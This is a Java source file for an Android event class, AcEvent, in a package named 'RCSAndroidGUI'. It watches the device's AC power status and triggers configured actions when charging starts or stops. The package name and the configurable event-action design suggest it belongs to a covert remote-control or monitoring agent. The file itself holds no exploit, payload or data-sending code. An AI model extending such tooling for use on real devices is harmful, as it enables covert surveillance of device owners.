package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.Ac;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerAc;
import com.ht.RCSAndroidGUI.util.DataBuffer;

public class AcEvent extends EventBase implements Observer<Ac> {
	/** The Constant TAG. */
	private static final String TAG = "AcEvent";

	private int actionOnExit, actionOnEnter;
	private boolean inRange = false;
	
	@Override
	public void begin() {
		ListenerAc.self().attach(this);
	}

	@Override
	public void end() {
		ListenerAc.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
		
		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();
		} catch (final IOException e) {
			Log.d("QZ", TAG + " Error: params FAILED");
			return false;
		}
		
		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Ac a) {
		Log.d("QZ", TAG + " Got power status notification: " + a.getStatus());

		// Nel range
		if (a.getStatus() == true && inRange == false) {
			inRange = true;
			Log.d("QZ", TAG + " AC IN");
			onEnter();
		} else if (a.getStatus() == false && inRange == true) {
			inRange = false;
			Log.d("QZ", TAG + " AC OUT");
			onExit();
		}
		
		return 0;
	}
	
	public void onEnter() {
		trigger(actionOnEnter);
	}

	public void onExit() {
		trigger(actionOnExit);
	}
}
